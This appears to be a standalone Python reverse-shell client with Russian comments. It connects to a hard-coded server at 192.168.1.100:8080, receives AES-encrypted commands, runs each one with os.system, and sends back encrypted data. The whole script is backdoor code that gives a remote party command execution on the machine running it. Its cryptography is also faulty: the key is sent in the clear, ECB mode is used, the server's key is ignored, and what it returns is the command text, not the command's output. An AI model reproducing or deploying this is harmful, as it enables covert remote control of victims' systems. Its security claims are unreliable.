import socket
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

BUFFER_SIZE = 1024
AES_KEY_SIZE = 32

def main():
    # Создание сокета
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Установка адреса и порта сервера
    server_address = ('192.168.1.100', 8080)

    # Подключение к серверу
    try:
        sock.connect(server_address)
        print("Подключение успешно")
    except Exception as e:
        print("Ошибка подключения к серверу:", e)
        return

    # Генерация ключа AES
    aes_key = get_random_bytes(AES_KEY_SIZE)

    # Обмен ключами с сервером
    sock.sendall(aes_key)
    server_aes_key = sock.recv(AES_KEY_SIZE)

    # Шифрование и дешифрование данных
    while True:
        # Получение команды от сервера
        buffer = sock.recv(BUFFER_SIZE)

        # Дешифрование команды
        cipher = AES.new(aes_key, AES.MODE_ECB)
        decrypted_buffer = cipher.decrypt(buffer)

        # Выполнение команды
        command = decrypted_buffer.decode('utf-8').strip()
        os.system(command)

        # Шифрование результата
        encrypted_buffer = cipher.encrypt(command.ljust(BUFFER_SIZE).encode('utf-8'))

        # Отправка результата на сервер
        sock.sendall(encrypted_buffer)

    sock.close()

if __name__ == "__main__":
    main()